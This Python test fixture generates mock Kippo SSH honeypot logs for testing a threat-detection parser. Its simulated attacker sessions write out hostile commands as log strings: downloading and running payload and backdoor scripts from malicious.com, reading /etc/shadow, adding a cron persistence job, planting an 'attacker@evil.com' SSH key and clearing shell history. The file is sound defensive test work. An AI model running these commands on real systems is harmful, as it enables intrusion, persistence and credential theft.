"""
Mock Kippo log data for testing various scenarios.
"""

from datetime import datetime, timedelta


class MockKippoLogs:
    """Generate realistic Kippo log entries for testing."""
    
    @staticmethod
    def basic_session_logs():
        """Basic session with login and simple commands."""
        return [
            "2024-01-15 10:30:15+0000 [SSHService ssh-connection on HoneyPotTransport,1,192.168.1.100] login attempt [root/password] succeeded",
            "2024-01-15 10:30:20+0000 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,1,192.168.1.100] CMD: whoami",
            "2024-01-15 10:30:25+0000 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,1,192.168.1.100] CMD: ls -la",
            "2024-01-15 10:30:30+0000 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,1,192.168.1.100] CMD: pwd",
            "2024-01-15 10:30:35+0000 [SSHService ssh-connection on HoneyPotTransport,1,192.168.1.100] connection lost",
        ]
    
    @staticmethod
    def malicious_session_logs():
        """Session with malicious activity for threat detection testing."""
        return [
            "2024-01-15 11:00:00+0000 [SSHService ssh-connection on HoneyPotTransport,2,192.168.1.101] login attempt [admin/admin] failed",
            "2024-01-15 11:00:05+0000 [SSHService ssh-connection on HoneyPotTransport,2,192.168.1.101] login attempt [admin/123456] succeeded",
            "2024-01-15 11:00:10+0000 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,2,192.168.1.101] CMD: uname -a",
            "2024-01-15 11:00:15+0000 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,2,192.168.1.101] CMD: cat /etc/passwd",
            "2024-01-15 11:00:20+0000 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,2,192.168.1.101] CMD: wget http://malicious.com/payload.sh",
            "2024-01-15 11:00:25+0000 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,2,192.168.1.101] CMD: chmod +x payload.sh",
            "2024-01-15 11:00:30+0000 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,2,192.168.1.101] CMD: ./payload.sh",
            "2024-01-15 11:00:35+0000 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,2,192.168.1.101] CMD: rm payload.sh",
            "2024-01-15 11:00:40+0000 [SSHService ssh-connection on HoneyPotTransport,2,192.168.1.101] connection lost",
        ]
    
    @staticmethod
    def brute_force_logs():
        """Multiple failed login attempts from same IP."""
        base_time = datetime(2024, 1, 15, 12, 0, 0)
        logs = []
        
        passwords = ["password", "123456", "admin", "root", "qwerty", "letmein", "welcome", "monkey"]
        
        for i, password in enumerate(passwords):
            timestamp = (base_time + timedelta(seconds=i*5)).strftime("%Y-%m-%d %H:%M:%S")
            logs.append(f"{timestamp}+0000 [SSHService ssh-connection on HoneyPotTransport,{i+10},192.168.1.102] login attempt [root/{password}] failed")
        
        # Final successful attempt
        timestamp = (base_time + timedelta(seconds=len(passwords)*5)).strftime("%Y-%m-%d %H:%M:%S")
        logs.append(f"{timestamp}+0000 [SSHService ssh-connection on HoneyPotTransport,{len(passwords)+10},192.168.1.102] login attempt [root/toor] succeeded")
        
        return logs
    
    @staticmethod
    def reconnaissance_logs():
        """Session focused on system reconnaissance."""
        return [
            "2024-01-15 13:00:00+0000 [SSHService ssh-connection on HoneyPotTransport,20,192.168.1.103] login attempt [user/user] succeeded",
            "2024-01-15 13:00:05+0000 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,20,192.168.1.103] CMD: uname -a",
            "2024-01-15 13:00:10+0000 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,20,192.168.1.103] CMD: cat /proc/version",
            "2024-01-15 13:00:15+0000 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,20,192.168.1.103] CMD: ps aux",
            "2024-01-15 13:00:20+0000 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,20,192.168.1.103] CMD: netstat -an",
            "2024-01-15 13:00:25+0000 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,20,192.168.1.103] CMD: cat /etc/passwd",
            "2024-01-15 13:00:30+0000 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,20,192.168.1.103] CMD: cat /etc/shadow",
            "2024-01-15 13:00:35+0000 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,20,192.168.1.103] CMD: find / -name '*.conf' 2>/dev/null",
            "2024-01-15 13:00:40+0000 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,20,192.168.1.103] CMD: ls -la /home",
            "2024-01-15 13:00:45+0000 [SSHService ssh-connection on HoneyPotTransport,20,192.168.1.103] connection lost",
        ]
    
    @staticmethod
    def file_manipulation_logs():
        """Session with file upload/download and manipulation."""
        return [
            "2024-01-15 14:00:00+0000 [SSHService ssh-connection on HoneyPotTransport,30,192.168.1.104] login attempt [test/test] succeeded",
            "2024-01-15 14:00:05+0000 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,30,192.168.1.104] CMD: cd /tmp",
            "2024-01-15 14:00:10+0000 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,30,192.168.1.104] CMD: wget http://example.com/script.sh",
            "2024-01-15 14:00:15+0000 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,30,192.168.1.104] CMD: curl -O http://example.com/data.txt",
            "2024-01-15 14:00:20+0000 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,30,192.168.1.104] CMD: chmod 755 script.sh",
            "2024-01-15 14:00:25+0000 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,30,192.168.1.104] CMD: ./script.sh",
            "2024-01-15 14:00:30+0000 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,30,192.168.1.104] CMD: cat data.txt",
            "2024-01-15 14:00:35+0000 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,30,192.168.1.104] CMD: rm script.sh data.txt",
            "2024-01-15 14:00:40+0000 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,30,192.168.1.104] CMD: history -c",
            "2024-01-15 14:00:45+0000 [SSHService ssh-connection on HoneyPotTransport,30,192.168.1.104] connection lost",
        ]
    
    @staticmethod
    def persistence_attempt_logs():
        """Session attempting to establish persistence."""
        return [
            "2024-01-15 15:00:00+0000 [SSHService ssh-connection on HoneyPotTransport,40,192.168.1.105] login attempt [backup/backup] succeeded",
            "2024-01-15 15:00:05+0000 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,40,192.168.1.105] CMD: whoami",
            "2024-01-15 15:00:10+0000 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,40,192.168.1.105] CMD: crontab -l",
            "2024-01-15 15:00:15+0000 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,40,192.168.1.105] CMD: echo '*/5 * * * * /tmp/.hidden/backdoor.sh' | crontab -",
            "2024-01-15 15:00:20+0000 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,40,192.168.1.105] CMD: mkdir -p /tmp/.hidden",
            "2024-01-15 15:00:25+0000 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,40,192.168.1.105] CMD: wget -O /tmp/.hidden/backdoor.sh http://malicious.com/backdoor.sh",
            "2024-01-15 15:00:30+0000 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,40,192.168.1.105] CMD: chmod +x /tmp/.hidden/backdoor.sh",
            "2024-01-15 15:00:35+0000 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,40,192.168.1.105] CMD: echo 'ssh-rsa AAAAB3NzaC1yc2E... attacker@evil.com' >> ~/.ssh/authorized_keys",
            "2024-01-15 15:00:40+0000 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,40,192.168.1.105] CMD: service ssh restart",
            "2024-01-15 15:00:45+0000 [SSHService ssh-connection on HoneyPotTransport,40,192.168.1.105] connection lost",
        ]
    
    @staticmethod
    def multiple_ips_logs():
        """Logs from multiple IP addresses for correlation testing."""
        logs = []
        ips = ["192.168.1.110", "192.168.1.111", "192.168.1.112", "10.0.0.50", "172.16.0.100"]
        
        base_time = datetime(2024, 1, 15, 16, 0, 0)
        
        for i, ip in enumerate(ips):
            session_id = 50 + i
            timestamp = (base_time + timedelta(minutes=i*2)).strftime("%Y-%m-%d %H:%M:%S")
            
            logs.extend([
                f"{timestamp}+0000 [SSHService ssh-connection on HoneyPotTransport,{session_id},{ip}] login attempt [root/password] succeeded",
                f"{timestamp}+0000 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,{session_id},{ip}] CMD: whoami",
                f"{timestamp}+0000 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,{session_id},{ip}] CMD: uname -a",
                f"{timestamp}+0000 [SSHService ssh-connection on HoneyPotTransport,{session_id},{ip}] connection lost",
            ])
        
        return logs
    
    @staticmethod
    def malformed_logs():
        """Malformed log entries for error handling testing."""
        return [
            "Invalid log entry without proper format",
            "2024-01-15 [Incomplete timestamp entry",
            "2024-01-15 17:00:00+0000 [Missing transport info] CMD: test",
            "",  # Empty line
            "2024-01-15 17:00:05+0000 [SSHService ssh-connection on HoneyPotTransport,60,192.168.1.120] login attempt [user/pass] succeeded",  # Valid entry
            "Completely malformed entry with no structure at all",
            "2024-01-15 17:00:10+0000 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,60,192.168.1.120] CMD: ls",  # Valid entry
        ]
    
    @staticmethod
    def get_all_scenarios():
        """Get all log scenarios combined."""
        all_logs = []
        all_logs.extend(MockKippoLogs.basic_session_logs())
        all_logs.extend(MockKippoLogs.malicious_session_logs())
        all_logs.extend(MockKippoLogs.brute_force_logs())
        all_logs.extend(MockKippoLogs.reconnaissance_logs())
        all_logs.extend(MockKippoLogs.file_manipulation_logs())
        all_logs.extend(MockKippoLogs.persistence_attempt_logs())
        all_logs.extend(MockKippoLogs.multiple_ips_logs())
        all_logs.extend(MockKippoLogs.malformed_logs())
        return all_logs
    
    @staticmethod
    def create_log_file(scenario_name, output_path):
        """Create a log file for a specific scenario."""
        scenario_methods = {
            'basic': MockKippoLogs.basic_session_logs,
            'malicious': MockKippoLogs.malicious_session_logs,
            'brute_force': MockKippoLogs.brute_force_logs,
            'reconnaissance': MockKippoLogs.reconnaissance_logs,
            'file_manipulation': MockKippoLogs.file_manipulation_logs,
            'persistence': MockKippoLogs.persistence_attempt_logs,
            'multiple_ips': MockKippoLogs.multiple_ips_logs,
            'malformed': MockKippoLogs.malformed_logs,
            'all': MockKippoLogs.get_all_scenarios,
        }
        
        if scenario_name not in scenario_methods:
            raise ValueError(f"Unknown scenario: {scenario_name}")
        
        logs = scenario_methods[scenario_name]()
        
        with open(output_path, 'w') as f:
            for log_line in logs:
                f.write(log_line + '\n')
        
        return output_path


if __name__ == "__main__":
    # Create sample log files for testing
    import os
    
    output_dir = "tests/test_integration/mock_data/log_files"
    os.makedirs(output_dir, exist_ok=True)
    
    scenarios = ['basic', 'malicious', 'brute_force', 'reconnaissance', 
                'file_manipulation', 'persistence', 'multiple_ips', 'malformed', 'all']
    
    for scenario in scenarios:
        output_file = os.path.join(output_dir, f"{scenario}_kippo.log")
        MockKippoLogs.create_log_file(scenario, output_file)
        print(f"Created {output_file}")